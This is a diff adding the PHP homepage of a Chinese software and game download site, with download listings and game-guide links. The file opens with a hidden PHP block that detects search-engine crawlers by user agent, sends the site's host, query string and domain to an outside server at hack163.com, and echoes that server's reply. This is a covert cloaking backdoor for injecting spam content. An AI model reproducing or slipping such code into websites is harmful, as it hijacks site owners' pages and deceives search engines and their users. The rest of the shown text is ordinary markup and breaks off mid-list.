@@ -1,0 +1,1524 @@
+<?php
+header('Content-Type:text/html;charset=gb2312');
+$key= $_SERVER["HTTP_USER_AGENT"];
+if(strpos($key,strtolower('HaosouSpider'))!== false||strpos($key,strtolower('baidu'))!== false||strpos($key,strtolower('Yisou'))!== false||strpos($key,strtolower('Sogou'))!== false||strpos($key,strtolower('YisouSpider'))!== false||strpos($key,strtolower('360Spider'))!== false||strpos($key,strtolower('Baiduspide'))!== false||strpos($key,strtolower('Soso'))!== false||strpos($key,strtolower('Yahoo'))!== false||strpos($key,strtolower('bingbot'))!== false )
+{
+date_default_timezone_set('PRC');
+$TD_server = "http://www.hack163.com/shou/";
+$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
+$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
+
+echo $Content_mb;
+}
+
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="applicable-device" content="pc"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <title>软件下载_bt下载_游戏下载-大理下载网</title>
+    <meta name="keywords" content="手机游戏,大理下载,手游大全,手机软件,手游下载,下载中心,大理bt下载" />
+    <meta name="description" content="大理bt下载网(dlbtn.com)提供游戏和软件的下载和交流,游戏下载中心游戏项目众多比如:竞技游戏,棋牌游戏,益智游戏,射击游戏,角色扮演等;手机软件有:影音播放,学习教育,社交聊天,旅游社交等,在这里大家不仅可以下载手机游戏和手机软件,还有最新的游戏排行和游戏攻略等着您！" />
+    <link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+    <!--引入公共资源0000-->
+    <link rel="stylesheet" href="/style/css/reset.css">
+    <link rel="stylesheet" href="/style/css/fonts.css">
+    <link rel="stylesheet" href="/style/css/common.css">
+    <base target="_blank">
+    <link rel="alternate" media="only screen and(max-width: 640px)" href="http://m.dlbtn.com/">
+    <script>
+        (function(){if(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|BlackBerry)/i)){window.location.href="http://m.dlbtn.com";}})();
+    </script>
+
+    <!--引入主页样式-->
+    <link rel="stylesheet" href="/style/css/swiper.min.css">
+    <link rel="stylesheet" href="/style/css/index.css">
+</head>
+<body>
+
+
+<header class="common_header"><div class="common_top-nav">
+    <div class="logo fl" id="logo"><a href="/"><img src="/style/picture/logo-pc.png"></a></div>
+    <nav id="common_nav"><div class="nav-wrapper clearfix">
+        <div  class='nav-item home active'><a href="http://www.dlbtn.com">首页</a></div>
+        <div class="show-mask" id="show-mask">
+
+            <div class="nav-item"><a href="/plus/list.php?tid=1">电脑下载</a>
+                <div class="sub-nav">
+
+                    <a href="/plus/list.php?tid=195"><i class="icon-network2"></i><span>休闲娱乐</span></a>
+
+
+                    <a href="/plus/list.php?tid=186"><i class="icon-system3"></i><span>人物通讯</span></a>
+
+
+
+                    <a href="/plus/list.php?tid=189"><i class="icon-comments"></i><span>阅读软件</span></a>
+
+                    <a href="/plus/list.php?tid=191"><i class="icon-image-dark"></i><span>消费金融</span></a>
+                    <a href="/plus/list.php?tid=190"><i class="icon-video"></i><span>摄影拍摄</span></a>
+                    <a href="/plus/list.php?tid=192"><i class="icon-mobile"></i><span>学习软件</span></a>
+
+                    <a href="/plus/list.php?tid=194"><i class="icon-develop"></i><span>出行必备</span></a>
+                    <a href="/plus/list.php?tid=197"><i class="icon-safe"></i><span>育儿教育</span></a>
+                    <a href="/plus/list.php?tid=196"><i class="icon-hardware"></i><span>股票软件</span></a>
+                    <a href="/plus/list.php?tid=187"><i class="icon-book"></i><span>影音播放</span></a>
+
+
+                    <a href="/plus/list.php?tid=1">全部分类</a></div></div>
+
+
+            <div class="nav-item">
+                <a href="/plus/list.php?tid=16">手机下载</a>
+
+                <div class="sub-nav"><span class="first-nav android_nav_toggle">
+<a href="/plus/list.php?tid=17"><i class="icon-android"></i><span>软件下载 <em>&gt;</em></span></a>
+
+<ul class="second-nav">
+<li><a href="/plus/list.php?tid=95"><i class="icon-play"></i><span>影音播放</span></a></li>
+<li><a href="/plus/list.php?tid=96"><i class="icon-finance"></i><span>智能电视</span></a></li>
+<li><a href="/plus/list.php?tid=97"><i class="icon-coffee"></i><span>便捷生活</span></a></li>
+<li><a href="/plus/list.php?tid=98"><i class="icon-e"></i><span>学习教育</span></a></li>
+<li><a href="/plus/list.php?tid=99"><i class="icon-system4"></i><span>系统工具</span></a></li>
+<li><a href="/plus/list.php?tid=100"><i class="icon-wechat"></i><span>社交聊天</span></a></li>
+<li><a href="/plus/list.php?tid=101"><i class="icon-car"></i><span>旅游出行</span></a></li>
+<li><a href="/plus/list.php?tid=102"><i class="icon-info"></i><span>资讯阅读</span></a></li>
+<li><a href="/plus/list.php?tid=103"><i class="icon-network"></i><span>网上购物</span></a></li>
+<li><a href="/plus/list.php?tid=104"><i class="icon-camera"></i><span>摄影摄像</span></a></li>
+<li><a href="/plus/list.php?tid=105"><i class="icon-health"></i><span>美食健康</span></a></li>
+
+</ul>
+</span><span class="first-nav android_nav_toggle">
+<a href="/plus/list.php?tid=18"><i class="icon-game"></i><span>手机游戏 <em>&gt;</em></span></a>
+
+<ul class="second-nav">
+<li><a href="/plus/list.php?tid=106"><i class="icon-puzzles"></i><span>休闲益智</span></a></li>
+<li><a href="/plus/list.php?tid=107"><i class="icon-action"></i><span>动作射击</span></a></li>
+<li><a href="/plus/list.php?tid=108"><i class="icon-roleplay"></i><span>角色扮演</span></a></li>
+<li><a href="/plus/list.php?tid=109"><i class="icon-cards"></i><span>策略塔防</span></a></li>
+<li><a href="/plus/list.php?tid=110"><i class="icon-basketball"></i><span>体育竞技</span></a></li>
+<li><a href="/plus/list.php?tid=111"><i class="icon-shooting"></i><span>模拟经营</span></a></li>
+<li><a href="/plus/list.php?tid=112"><i class="icon-bulb"></i><span>音乐游戏</span></a></li>
+<li><a href="/plus/list.php?tid=113"><i class="icon-music"></i><span>儿童游戏</span></a></li>
+<li><a href="/plus/list.php?tid=114"><i class="icon-children"></i><span>游戏辅助</span></a></li>
+    <!---->
+
+</ul></span>
+                    <a href="/plus/list.php?tid=16">全部分类</a>
+
+                </div></div>
+
+
+
+            <div class="nav-item">
+                <a href="/plus/list.php?tid=26">游戏攻略</a>
+
+                <div class="sub-nav">
+                    <a href="/plus/list.php?tid=27"><i class=""></i><span>单机游戏</span></a>
+
+                    <a href="/plus/list.php?tid=28"><i class=""></i><span>手机游戏</span></a>
+
+                    <a href="/plus/list.php?tid=29"><i class=""></i><span>网络游戏</span></a>
+
+                    <a href="/plus/list.php?tid=30"><i class=""></i><span>操作教程</span></a>
+
+
+
+                    <a href="/plus/list.php?tid=26">全部分类</a>
+
+                </div></div>
+
+
+
+
+        </div><span class="line"></span>
+
+        <div class="nav-item">
+            <a href="/plus/list.php?tid=31">排行榜</a>
+
+        </div>
+
+
+    </div></nav>
+
+    <div class="search fr" id="search" ><span class="icon icon-search-icon"></span>
+        <form action="/plus/search.php" method="get" class="search-form">
+            <input type="text" name="q" class="ipt" placeholder="请您输入搜索关键词，例如：QQ、迅雷">
+            <button  type="submit" class="btn">搜索</button></form>
+
+    </div>
+</div><div class="header-mask" id="header-mask"></div></header>
+
+
+<main class="container clearfix">
+    <!--顶部banner-->
+    <div class="swiper-container index-banner">
+        <ul class="swiper-wrapper">
+            <li class="swiper-slide"><a href="http://www.dlbtn.com/"><img src="/style/picture/10170023_16eb6fed88.jpg"></a></li>
+        </ul>
+        <div class="swiper-button-prev btn-left" id="banner-left"></div>
+        <div class="swiper-button-next btn-right" id="banner-right"></div>
+        <div class="pagination banner-pagination"></div>
+    </div>
+    <!--最新推荐-->
+    <section class="new-recommend clearfix" id="new-recs">
+        <h2 class="index-title recommend">最新推荐</h2>
+        <div>
+            <ul class="recommend-nav fl">
+                <li class="nav-item active icon-computer">电脑软件</li>
+                <li class="nav-item icon-android">手机软件</li>
+                <li class="nav-item icon-game">手机游戏</li>
+
+            </ul>
+            <div class="views-wrapper clearfix">
+                <ul class="nav-view active">
+
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=258651" title="生肖传说  官方版 v1.0.121">
+                            <img src="http://downza.img.zz314.com/soft/khd-355/2018-06-14/1e04eaa9ed7a9f301af43cf92064688b.jpg" alt="生肖传说  官方版 v1.0.121"  width="80" height="80">
+                            <p class="item-title">生肖传说  官方版 v1.0.121</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=258650" title="PGP  官方版 v2.9.37.0923">
+                            <img src="http://downza.img.zz314.com/soft/yxgj-101/2016-11-23/d44c867f9af95ae192f2106b504ea9e0.png" alt="PGP  官方版 v2.9.37.0923"  width="80" height="80">
+                            <p class="item-title">PGP  官方版 v2.9.37.0923</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257905" title="逆战  官方版 v1.0.1.79">
+                            <img src="http://downza.img.zz314.com/soft/wlyx-108/2018-02-01/41bb1f84da25cde6141c510beadb8d34.jpg" alt="逆战  官方版 v1.0.1.79"  width="80" height="80">
+                            <p class="item-title">逆战  官方版 v1.0.1.79</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257904" title="火箭滑雪赛  中文版">
+                            <img src="http://downza.img.zz314.com/soft/tyjj-336/2018-05-15/a748a5190ec59ac15195992f19a879a9.jpg" alt="火箭滑雪赛  中文版"  width="80" height="80">
+                            <p class="item-title">火箭滑雪赛  中文版</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257903" title="英雄杀  单机版">
+                            <img src="http://img3.downza.cn/download/202009/134903-5f6d84cf3f35e.jpg" alt="英雄杀  单机版"  width="80" height="80">
+                            <p class="item-title">英雄杀  单机版</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257902" title="豆客对战平台  官方最新版 v3.3">
+                            <img src="http://img3.downza.cn/download/202009/091306-5f6fe722cf8e2.jpg" alt="豆客对战平台  官方最新版 v3.3"  width="80" height="80">
+                            <p class="item-title">豆客对战平台  官方最新版 v3.3</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257901" title="09电竞平台  绿色版 v3.0.9">
+                            <img src="http://downza.img.zz314.com/soft/yxgj-101/2017-06-14/961aebd9aacd5ea08c9203ff89af4e0c.png" alt="09电竞平台  绿色版 v3.0.9"  width="80" height="80">
+                            <p class="item-title">09电竞平台  绿色版 v3.0.9</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257900" title="王者荣耀  电脑版 v2020.9.24">
+                            <img src="http://img3.downza.cn/download/202009/134444-5f7026cc15581.jpg" alt="王者荣耀  电脑版 v2020.9.24"  width="80" height="80">
+                            <p class="item-title">王者荣耀  电脑版 v2020.9.24</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257592" title="苹果IPAD模拟器(iPadian)  v3.0">
+                            <img src="http://img3.downza.cn/download/201805/135842-5b0f8f1211294.jpg" alt="苹果IPAD模拟器(iPadian)  v3.0"  width="80" height="80">
+                            <p class="item-title">苹果IPAD模拟器(iPadian)  v3.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257591" title="剑侠情缘3  官方版 v1.0.0.671">
+                            <img src="http://downza.img.zz314.com/soft/jsby-420/2018-05-10/e2076a9e4d529eda8f452322e911edac.jpg" alt="剑侠情缘3  官方版 v1.0.0.671"  width="80" height="80">
+                            <p class="item-title">剑侠情缘3  官方版 v1.0.0.671</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257590" title="逗游游戏盒2021  官方版 v2021">
+                            <img src="http://img3.downza.cn/download/202009/104243-5f65702366d25.jpg" alt="逗游游戏盒2021  官方版 v2021"  width="80" height="80">
+                            <p class="item-title">逗游游戏盒2021  官方版 v2021</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257185" title="云即玩游戏盒2021">
+                            <img src="http://img3.downza.cn/download/202009/092957-5f68021596f85.jpg" alt="云即玩游戏盒2021"  width="80" height="80">
+                            <p class="item-title">云即玩游戏盒2021</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257504" title="积米_ios v3.4.0_免费下载">
+                            <img src="http://img.download.pchome.net/42/og/logo.png" alt="积米_ios v3.4.0_免费下载"  width="80" height="80">
+                            <p class="item-title">积米_ios v3.4.0_免费下载</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257503" title="天弘爱理财_Android7.0 _手机下载">
+                            <img src="//img-download.pchome.net/download/1k0/n2/47/o8jo22-1d71.png" alt="天弘爱理财_Android7.0 _手机下载"  width="80" height="80">
+                            <p class="item-title">天弘爱理财_Android7.0 _手机下载</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/plus/view.php?aid=257502" title="瑞理财_ios 2.0.0_在线下载">
+                            <img src="https://i0download.pchome.net/g1/M00/07/1E/oYYBAFNoVLKIL3F1AABOi-x6ypwAABglQANWqIAAE6j369.jpg" alt="瑞理财_ios 2.0.0_在线下载"  width="80" height="80">
+                            <p class="item-title">瑞理财_ios 2.0.0_在线下载</p>
+                        </a>
+                    </li>
+
+
+                </ul>
+                <ul class="nav-view">
+
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261518.html" title="美印兔兔小助手v1.0">
+                            <img src="/uploads/allimg/201025/1_10251054232401.png" alt="美印兔兔小助手v1.0"  width="80" height="80">
+                            <p class="item-title">美印兔兔小助手v1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sjlt/261516.html" title="唔哩星球安卓版v3.8.5">
+                            <img src="/uploads/allimg/201025/1_10251042296201.png" alt="唔哩星球安卓版v3.8.5"  width="80" height="80">
+                            <p class="item-title">唔哩星球安卓版v3.8.5</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261515.html" title="魔术美颜相机v5.7">
+                            <img src="/uploads/allimg/201025/1_10251042219A2.png" alt="魔术美颜相机v5.7"  width="80" height="80">
+                            <p class="item-title">魔术美颜相机v5.7</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261514.html" title="o2cam氧气相机v2.0.0">
+                            <img src="/uploads/allimg/201025/1_1025103021Ca.png" alt="o2cam氧气相机v2.0.0"  width="80" height="80">
+                            <p class="item-title">o2cam氧气相机v2.0.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261512.html" title="爱自拍v6.61.505">
+                            <img src="/uploads/allimg/201025/1_1025101R04W0.png" alt="爱自拍v6.61.505"  width="80" height="80">
+                            <p class="item-title">爱自拍v6.61.505</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261510.html" title="动漫遮脸相机v1.0.8">
+                            <img src="/uploads/allimg/201025/1_10251006212042.png" alt="动漫遮脸相机v1.0.8"  width="80" height="80">
+                            <p class="item-title">动漫遮脸相机v1.0.8</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261508.html" title="漫画相机v1.1">
+                            <img src="/uploads/allimg/201025/1_1025095422PD.png" alt="漫画相机v1.1"  width="80" height="80">
+                            <p class="item-title">漫画相机v1.1</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261506.html" title="Marrs相机v1.1.1">
+                            <img src="/uploads/allimg/201025/1_102509422060Y.jpg" alt="Marrs相机v1.1.1"  width="80" height="80">
+                            <p class="item-title">Marrs相机v1.1.1</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261504.html" title="超级美颜美图v4.1.4">
+                            <img src="/uploads/allimg/201025/1_1025093020A44.png" alt="超级美颜美图v4.1.4"  width="80" height="80">
+                            <p class="item-title">超级美颜美图v4.1.4</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sjlt/261502.html" title="手机QQ安卓版v8.4.10">
+                            <img src="/uploads/allimg/201025/1_1025091U1aF.png" alt="手机QQ安卓版v8.4.10"  width="80" height="80">
+                            <p class="item-title">手机QQ安卓版v8.4.10</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261501.html" title="印象v1.7.1">
+                            <img src="/uploads/allimg/201025/1_1025091R04156.png" alt="印象v1.7.1"  width="80" height="80">
+                            <p class="item-title">印象v1.7.1</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261500.html" title="轻摄v1.0">
+                            <img src="/uploads/allimg/201025/1_10250Z6205146.png" alt="轻摄v1.0"  width="80" height="80">
+                            <p class="item-title">轻摄v1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261499.html" title="行拍v1.1.1">
+                            <img src="/uploads/allimg/201025/1_10250U4214R2.png" alt="行拍v1.1.1"  width="80" height="80">
+                            <p class="item-title">行拍v1.1.1</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261498.html" title="布丁相机v2.8.7.1988">
+                            <img src="/uploads/allimg/201025/1_10250T2245L9.png" alt="布丁相机v2.8.7.1988"  width="80" height="80">
+                            <p class="item-title">布丁相机v2.8.7.1988</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/rjxz/sysx/261497.html" title="诺亚相机v5.02">
+                            <img src="/uploads/allimg/201025/1_10250S022F20.png" alt="诺亚相机v5.02"  width="80" height="80">
+                            <p class="item-title">诺亚相机v5.02</p>
+                        </a>
+                    </li>
+
+
+
+
+                </ul>
+                <ul class="nav-view">
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261519.html" title="Out of The Boxv1.48">
+                            <img src="/uploads/allimg/201025/1_10251056101M1.jpg" alt="Out of The Boxv1.48"  width="80" height="80">
+                            <p class="item-title">Out of The Boxv1.48</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261517.html" title="my kitten girlfriendv1.0.0">
+                            <img src="/uploads/allimg/201025/1_10251043105V9.png" alt="my kitten girlfriendv1.0.0"  width="80" height="80">
+                            <p class="item-title">my kitten girlfriendv1.0.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261513.html" title="秘密组织7卷土重来完整版v1.0">
+                            <img src="/uploads/allimg/201025/1_10251030113c3.png" alt="秘密组织7卷土重来完整版v1.0"  width="80" height="80">
+                            <p class="item-title">秘密组织7卷土重来完整版v1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261511.html" title="Legends and Lettersv1.3.0">
+                            <img src="/uploads/allimg/201025/1_1025101G06000.jpg" alt="Legends and Lettersv1.3.0"  width="80" height="80">
+                            <p class="item-title">Legends and Lettersv1.3.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261509.html" title="明日尽头demov1.0安卓版">
+                            <img src="/uploads/allimg/201025/1_102510042DY3.png" alt="明日尽头demov1.0安卓版"  width="80" height="80">
+                            <p class="item-title">明日尽头demov1.0安卓版</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261507.html" title="文字打宝v1.0">
+                            <img src="/uploads/allimg/201025/1_102509511150F.png" alt="文字打宝v1.0"  width="80" height="80">
+                            <p class="item-title">文字打宝v1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261505.html" title="我想嫁给你v1.0.0">
+                            <img src="/uploads/allimg/201025/1_1025093Q0PT.jpg" alt="我想嫁给你v1.0.0"  width="80" height="80">
+                            <p class="item-title">我想嫁给你v1.0.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261503.html" title="Project Cv1.0">
+                            <img src="/uploads/allimg/201025/1_102509251615V.png" alt="Project Cv1.0"  width="80" height="80">
+                            <p class="item-title">Project Cv1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261480.html" title="level maker 2v0.1.0">
+                            <img src="/uploads/allimg/201024/1_1024210G111I.png" alt="level maker 2v0.1.0"  width="80" height="80">
+                            <p class="item-title">level maker 2v0.1.0</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261477.html" title="七七四十九v3.1">
+                            <img src="/uploads/allimg/201024/1_1024205411D42.jpg" alt="七七四十九v3.1"  width="80" height="80">
+                            <p class="item-title">七七四十九v3.1</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261475.html" title="剑士Kenshi">
+                            <img src="/uploads/allimg/201024/1_102420411221A.png" alt="剑士Kenshi"  width="80" height="80">
+                            <p class="item-title">剑士Kenshi</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261472.html" title="千年的终结v1.8">
+                            <img src="/uploads/allimg/201024/1_1024202Q12406.jpg" alt="千年的终结v1.8"  width="80" height="80">
+                            <p class="item-title">千年的终结v1.8</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261470.html" title="武器合成大师手游v3.0安卓版">
+                            <img src="/uploads/allimg/201024/1_10242015111435.png" alt="武器合成大师手游v3.0安卓版"  width="80" height="80">
+                            <p class="item-title">武器合成大师手游v3.0安卓版</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261468.html" title="Miracle Pororov1.0.2">
+                            <img src="/uploads/allimg/201024/1_10242002122X6.png" alt="Miracle Pororov1.0.2"  width="80" height="80">
+                            <p class="item-title">Miracle Pororov1.0.2</p>
+                        </a>
+                    </li>
+                    <li class="content-item">
+                        <a href="/sjxz/sjyx/jsby/261466.html" title="少女心动了v1.0.1">
+                            <img src="/uploads/allimg/201024/1_1024194911K32.jpg" alt="少女心动了v1.0.1"  width="80" height="80">
+                            <p class="item-title">少女心动了v1.0.1</p>
+                        </a>
+                    </li>
+
+                </ul>
+
+
+                <div class="get-more">
+                    <a href="/plus/list.php?tid=1" class="more active">查看更多 &gt;&gt;</a>
+                    <a href="/plus/list.php?tid=17" class="more">查看更多 &gt;&gt;</a>
+                    <a href="/plus/list.php?tid=18" class="more">查看更多 &gt;&gt;</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!--最新文章-->
+    <section class="new-article" id="new-articles">
+        <h2 class="index-title article">最新文章</h2>
+        <ul class="clearfix">
+
+            <li class="article-item">
+                <a href="/yxgl/261267.html" title="幻世录1技能加点_幻世录1主角怎么加点？">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_1023161642A62.jpg" alt="幻世录1技能加点_幻世录1主角怎么加点？" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">幻世录1技能加点_幻世录1主角怎么加</p>
+                        <p class="article-intro">看着你本人爱好，本人觉得加别的的好，由于早觉醒得话，人物角色能够有大量专业技能与新工作能力。...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261267&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261266.html" title="暗黑破坏神2地图第一章节详情攻略">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_1023160ZG309.jpg" alt="暗黑破坏神2地图第一章节详情攻略" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">暗黑破坏神2地图第一章节详情攻略</p>
+                        <p class="article-intro">刚开始后,去找阿卡拉(Akara)巫师。她告知你觉得她是这儿的头子，因此 要想立足于就需要获得她的信任感，想要你去闯基地外的一个洞窟。...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261266&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261265.html" title="明星志愿3甜蜜乐章夏以军全支线攻略">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_102316031YR9.jpg" alt="明星志愿3甜蜜乐章夏以军全支线攻略" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">明星志愿3甜蜜乐章夏以军全支线攻略</p>
+                        <p class="article-intro">豪门爱恋拍完后，主角会自动说要把DVD还给强尼戴。去SOSA找强尼戴他会先不理你，等你当天行程结束后...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261265&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261264.html" title="是特工就上一百层新手通关攻略及小技巧">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_10231529343145.jpg" alt="是特工就上一百层新手通关攻略及小技巧" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">是特工就上一百层新手通关攻略及小</p>
+                        <p class="article-intro">做为一款破译类的缓解压力手游游戏，许多小伙伴们在暑假都会与游戏里面的警员互斗。...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261264&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261263.html" title="梦之旅2梦之瑰宝怎么快速解锁？">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_10231510001D6.jpg" alt="梦之旅2梦之瑰宝怎么快速解锁？" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">梦之旅2梦之瑰宝怎么快速解锁？</p>
+                        <p class="article-intro">本作拥有更为细致的界面，如精雕细刻般，20个全新升级的情景给大伙儿展示出一幅童话般的界面...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261263&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261262.html" title="风云天下会怎么快速领悟排云掌?">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_10231500462092.jpg" alt="风云天下会怎么快速领悟排云掌?" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">风云天下会怎么快速领悟排云掌?</p>
+                        <p class="article-intro">霍惊觉(步惊云)是一个自幼丧父的孤儿，母亲改嫁霍步天，但是母亲在改嫁过门不久...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261262&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261261.html" title="火炬之光2装备存档攻略教程">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_102314504UY3.jpg" alt="火炬之光2装备存档攻略教程" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">火炬之光2装备存档攻略教程</p>
+                        <p class="article-intro">美少女梦工厂2中有很多特性必须大家留意的,稍有不留心,便会更改大家的结果迈向...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261261&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261260.html" title="国王的恩赐传奇愤怒之灵怎么获得？">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_1023142R35413.jpg" alt="国王的恩赐传奇愤怒之灵怎么获得？" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">国王的恩赐传奇愤怒之灵怎么获得？</p>
+                        <p class="article-intro">结合了冒险界面即时制、战斗界面回合制，游戏提供三类角色选择：战士，骑士和法师。...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261260&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261259.html" title="看门狗隐藏武器怎么获取？">
+                    <img class="lazy" data-original="/uploads/allimg/201023/1_1023140RU594.jpg" alt="看门狗隐藏武器怎么获取？" width="200" height="150">
+                    <div class="fr content">
+                        <p class="article-title">看门狗隐藏武器怎么获取？</p>
+                        <p class="article-intro">游戏者一定要扮演年轻聪明的黑客马可仕·哈洛威，他即将来到技术革命的发源地旧金山湾区。...</p>
+                    </div>
+                </a>
+                <p class="type-info"><a href="/plus/list.php?tid=26" class="type">游戏攻略</a><span class="viewed">浏览量: <script src="/plus/count.php?view=no&aid=261259&mid=1" type='text/javascript' language="javascript"></script></span></p>
+            </li>
+            <li class="article-item">
+                <a href="/yxgl/261258.html" title="古墓丽影3最终boss怎么打？">
